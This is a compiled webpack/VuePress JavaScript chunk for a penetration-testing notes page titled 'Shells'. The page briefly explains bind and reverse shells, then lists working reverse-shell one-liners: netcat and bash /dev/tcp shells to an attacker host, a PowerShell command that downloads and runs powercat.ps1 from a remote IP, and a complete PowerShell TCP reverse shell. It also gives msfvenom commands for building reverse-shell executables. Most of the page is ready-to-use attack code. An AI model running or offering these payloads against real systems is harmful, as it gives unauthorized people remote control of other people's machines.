(window.webpackJsonp=window.webpackJsonp||[]).push([[59],{401:function(e,s,a){"use strict";a.r(s);var t=a(13),r=Object(t.a)({},(function(){var e=this,s=e._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[s("h1",{attrs:{id:"shells"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#shells"}},[e._v("#")]),e._v(" Shells")]),e._v(" "),s("p",[e._v("This section is all about shells")]),e._v(" "),s("h2",{attrs:{id:"bind-shell-vs-reverse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bind-shell-vs-reverse-shell"}},[e._v("#")]),e._v(" Bind shell vs reverse shell")]),e._v(" "),s("h3",{attrs:{id:"bind-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bind-shell"}},[e._v("#")]),e._v(" Bind shell")]),e._v(" "),s("p",[e._v("Basically, we are opening a port with our shell for other people to execute")]),e._v(" "),s("ul",[s("li",[e._v("Client computer starts up a listening session with shell executing on that port")]),e._v(" "),s("li",[e._v("Connector just connects to the listening port that has shell already running")])]),e._v(" "),s("h3",{attrs:{id:"reverse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#reverse-shell"}},[e._v("#")]),e._v(" Reverse shell")]),e._v(" "),s("p",[e._v("Basically, we are sending our own shell over to the operator")]),e._v(" "),s("ul",[s("li",[e._v("Operator listens on a port")]),e._v(" "),s("li",[e._v("Client computer connects to the listening port on the operator with the client's own shell")]),e._v(" "),s("li",[e._v("Operator now has control of clients shell")])]),e._v(" "),s("h4",{attrs:{id:"netcat-reverse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#netcat-reverse-shell"}},[e._v("#")]),e._v(" Netcat reverse shell")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[e._v("nc")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("<")]),e._v("listening_host"),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("<")]),e._v("listening_port"),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-e")]),e._v(" /bin/bash\n")])])]),s("h4",{attrs:{id:"tcp-revsrse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#tcp-revsrse-shell"}},[e._v("#")]),e._v(" TCP revsrse shell")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("/bin/bash "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-i")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" /dev/tcp/"),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("<")]),e._v("attacker_ip"),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v("/"),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("<")]),e._v("port"),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[e._v("0")]),e._v("<")]),s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[e._v("&1")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[e._v("2")]),e._v(">")]),s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[e._v("&1")]),e._v("\n")])])]),s("h4",{attrs:{id:"powercat-reverse-shell-example"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#powercat-reverse-shell-example"}},[e._v("#")]),e._v(" Powercat reverse shell example")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("powershell "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-c")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[e._v("\"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd\"")]),e._v("\n")])])]),s("h4",{attrs:{id:"powershell-reverse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#powershell-reverse-shell"}},[e._v("#")]),e._v(" Powershell reverse shell")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("powershell "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-nop")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-c")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[e._v('"'),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$client")]),e._v(" = New-Object System.Net.Sockets.TCPClient('192.168.119.194',5555);"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$stream")]),e._v(" = "),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$client")]),e._v(".GetStream();[byte[]]"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$bytes")]),e._v(" = 0..65535|%{0};while"),s("span",{pre:!0,attrs:{class:"token variable"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("((")]),e._v("$i "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v(" $stream.Read"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),e._v("$bytes"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" $bytes.Length"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("))")])]),e._v(" -ne 0){;"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$data")]),e._v(" = (New-Object -TypeName System.Text.ASCIIEncoding).GetString("),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$bytes")]),e._v(",0, "),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$i")]),e._v(");"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$sendback")]),e._v(" = (iex "),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$data")]),e._v(" 2>&1 | Out-String );"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$sendback2")]),e._v(" = "),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$sendback")]),e._v(" + 'PS ' + (pwd).Path + '> ';"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$sendbyte")]),e._v(" = ([text.encoding]::ASCII).GetBytes("),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$sendback2")]),e._v(");"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$stream")]),e._v(".Write("),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$sendbyte")]),e._v(",0,"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$sendbyte")]),e._v(".Length);"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$stream")]),e._v(".Flush()};"),s("span",{pre:!0,attrs:{class:"token variable"}},[e._v("$client")]),e._v('.Close()"')]),e._v("\n")])])]),s("h2",{attrs:{id:"generating-shell-payloads"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#generating-shell-payloads"}},[e._v("#")]),e._v(" Generating shell payloads")]),e._v(" "),s("h3",{attrs:{id:"stageless-payload-catchable-with-netcat"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#stageless-payload-catchable-with-netcat"}},[e._v("#")]),e._v(" Stageless payload (catchable with netcat)")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-p")]),e._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[e._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("192.168")]),e._v(".119.194 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[e._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("80")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-f")]),e._v(" exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" shell.exe\n")])])]),s("h3",{attrs:{id:"staged-payloads-caught-with-meterpreter-or-other-programs"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#staged-payloads-caught-with-meterpreter-or-other-programs"}},[e._v("#")]),e._v(" Staged payloads (caught with meterpreter or other programs)")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-p")]),e._v(" windows/meterpreter/reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[e._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.11")]),e._v(".0.4 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[e._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("5555")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-f")]),e._v(" exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" binary.exe\n")])])])])}),[],!1,null,null,null);s.default=r.exports}}]);